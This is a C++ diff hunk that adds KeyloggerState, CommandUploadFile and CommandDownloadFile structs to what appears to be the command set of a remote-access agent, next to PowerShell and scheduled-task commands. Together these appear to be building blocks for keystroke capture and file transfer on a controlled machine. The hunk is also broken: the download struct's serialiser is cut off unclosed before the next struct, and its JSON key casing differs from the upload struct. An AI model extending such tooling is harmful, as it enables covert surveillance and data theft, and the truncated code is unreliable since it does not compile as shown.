@@ -28,6 +28,37 @@ struct CommandPowershell
     }
 };
 
+struct KeyloggerState
+{
+    bool isRunning;
+    std::string data;
+};
+
+struct CommandUploadFile
+{
+    std::string path;
+
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
+        rapidjson::Value value(rapidjson::kObjectType);
+        value.AddMember("path", rapidjson::Value(path.c_str(), allocator), allocator);
+        return value;
+    }
+};
+
+struct CommandDownloadFile
+{
+    std::string path;
+    std::string data;
+    std::int64_t offset;
+    std::int64_t totalBytes;
+    bool final;
+
+    rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
+    {
+        rapidjson::Value value(rapidjson::kObjectType);
+        value.AddMember("Path", rapidjson::Value(path.c_str(), allocator), allocator);
+        return value;
 struct CommandWinTask
 {
     std::string path;
